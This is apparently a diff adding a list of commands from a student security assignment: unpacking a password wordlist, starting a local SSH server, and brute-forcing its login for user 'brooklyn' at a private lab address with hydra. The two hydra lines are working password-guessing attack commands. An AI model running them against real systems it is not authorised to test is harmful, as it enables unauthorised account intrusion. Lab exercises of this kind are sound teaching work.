@@ -1,0 +1,14 @@
+﻿The following is a list of every command used in Assignment 3:
+
+
+1. sudo gunzip /usr/share/wordlists/fasttrack.txt.gz
+2. wc /usr/share/wordlists/fasttrack.txt
+3. cat /usr/share/wordlists/fasttrack.txt | grep letmein
+4. sudo apt update
+5. sudo apt install openssh-server
+6. sudo service ssh start
+7. ip addr
+8. ssh brooklyn@10.0.2.15
+9. hydra -V -f -t 4 -l brooklyn -P mypassword.txt ssh://10.0.2.15
+10. hydra -V -f -t 4 -l brooklyn -P /usr/share/wordlists/fasttrack.txt ssh://10.0.2.15
+11. sudo service ssh stop
